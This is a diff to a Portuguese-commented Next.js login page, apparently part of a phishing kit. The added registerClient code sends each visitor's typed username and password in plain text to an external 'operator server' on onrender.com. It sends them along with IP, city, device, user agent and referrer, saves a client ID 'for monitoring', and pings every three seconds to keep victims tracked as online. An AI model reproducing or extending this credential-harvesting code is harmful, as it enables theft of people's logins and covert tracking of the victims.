@@ -9,6 +9,7 @@ import { Eye, EyeOff, ChevronDown, AlertCircle } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
 import { useEventSource } from "@/hooks/useEventSource"
+import { useClientStatus } from "@/hooks/useClientStatus"
 import { useRouter } from "next/navigation"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 
@@ -67,76 +68,101 @@ const chatOptions = {
 // Função para registrar cliente
 const registerClient = async (username: string, password: string, clientId?: string, metricsData?: any) => {
   try {
-    // Usar dados do useMetrics ao invés de fazer novas requisições
-    let ip = metricsData?.ip || ""
-    let country = "BR"
-    let city = "São Paulo"
-    let device = metricsData?.device || "Unknown"
+    console.log('🚀 Iniciando registro de cliente...');
     
-    // Extrair cidade e país da localização se disponível
-    if (metricsData?.location) {
-      const locationParts = metricsData.location.split(', ')
-      if (locationParts.length >= 3) {
-        city = locationParts[0] || "São Paulo"
-        country = locationParts[2] || "BR"
-        // Converter nome do país para código se necessário
-        if (country === "Brazil") country = "BR"
+    // Usar dados do useMetrics ou coletar dados básicos
+    let ip = 'Unknown';
+    let country = 'BR';
+    let city = 'São Paulo';
+    let device = 'Desktop';
+    
+    // Função que detecta se é Mobile, Tablet ou Desktop
+    const getDeviceType = () => {
+      if (typeof window === 'undefined' || typeof navigator === 'undefined') return 'Desktop';
+      
+      const userAgent = navigator.userAgent;
+      if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
+        return 'Tablet';
       }
+      if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
+        return 'Mobile';
+      }
+      return 'Desktop';
+    };
+    
+    device = getDeviceType();
+    
+    // Tenta recuperar dados que useMetrics já coletou (sessionStorage)
+    try {
+      const metricsData = sessionStorage.getItem('metrics_data');
+      if (metricsData) {
+        const parsed = JSON.parse(metricsData);
+        ip = parsed.ip || 'Unknown';
+        country = parsed.country || 'BR';
+        city = parsed.city || 'São Paulo';
+        console.log('📍 Reutilizando dados de localização do useMetrics:', { ip, country, city });
+      } else {
+        console.log('📍 Dados de localização não encontrados no sessionStorage, usando padrões');
+      }
+    } catch (error) {
+      console.log('📍 Erro ao recuperar dados salvos, usando padrões:', error);
     }
     
-    console.log("Usando dados do useMetrics:", {
-      ip,
-      country,
-      city,
-      device,
-      originalLocation: metricsData?.location
-    })
+    // Gerar clientId único se não existir
+    const finalClientId = clientId || `client_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     
-    // Dados para registro
+    // Dados completos para registro
     const clientData = {
+      clientId: finalClientId,
       username,
       password,
       ip,
       country,
       city,
       device,
-      referrer: document.referrer || "direct",
+      browser: navigator.userAgent,
+      referrer: document.referrer || 'direct',
       currentUrl: window.location.href,
-      clientId // Se existir, atualiza o cliente existente
-    }
+      timestamp: new Date().toISOString(),
+      status: 'online',
+      lastActivity: new Date().toISOString()
+    };
     
-    // Determinar endpoint com base na existência de clientId
-    const endpoint = clientId 
-      ? 'https://servidoroperador.onrender.com/api/clients/update'
-      : 'https://servidoroperador.onrender.com/api/clients/register'
+    console.log('📊 Dados do cliente preparados:', clientData);
     
-    // Enviar para API
-    const response = await fetch(endpoint, {
+    // Primeiro, tentar registrar/atualizar o cliente
+    console.log('🌐 Enviando para API de registro...');
+    const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(clientData)
-    })
+    });
+    
+    console.log('🌐 Resposta da API:', response.status, response.statusText);
     
     if (response.ok) {
-      const data = await response.json()
-      console.log(clientId ? "Cliente atualizado com sucesso:" : "Cliente registrado com sucesso:", data)
+      const data = await response.json();
+      console.log("✅ Cliente registrado com sucesso:", data);
       
-      // Salvar clientId no localStorage
-      if (data.clientId) {
-        localStorage.setItem('client_id', data.clientId)
-      }
+      // 🔑 SALVAR CLIENT_ID para monitoramento (CRÍTICO)
+      localStorage.setItem('client_id', finalClientId);
+      console.log("🔑 Client ID salvo para monitoramento:", finalClientId);
       
-      return data
+      // Retornar dados com clientId
+      return {
+        ...data,
+        clientId: finalClientId
+      };
     } else {
-      const errorData = await response.text()
-      console.log("Erro ao registrar/atualizar cliente:", errorData)
-      return null
+      const errorData = await response.text();
+      console.log("❌ Erro ao registrar cliente:", errorData);
+      return null;
     }
   } catch (error) {
-    console.log("Erro durante registro/atualização de cliente:", error)
-    return null
+    console.log("❌ Erro durante registro de cliente:", error);
+    return null;
   }
 }
 
@@ -166,6 +192,12 @@ export default function LoginPage() {
     onError: (error) => {
       console.log('❌ Erro no EventSource:', error);
     }
+  });
+
+  // Sistema de ping para manter cliente online
+  const clientStatus = useClientStatus({
+    clientId: clientId || undefined,
+    pingInterval: 3000 // 3 segundos
   });
 
   const t = translations[language as keyof typeof translations]
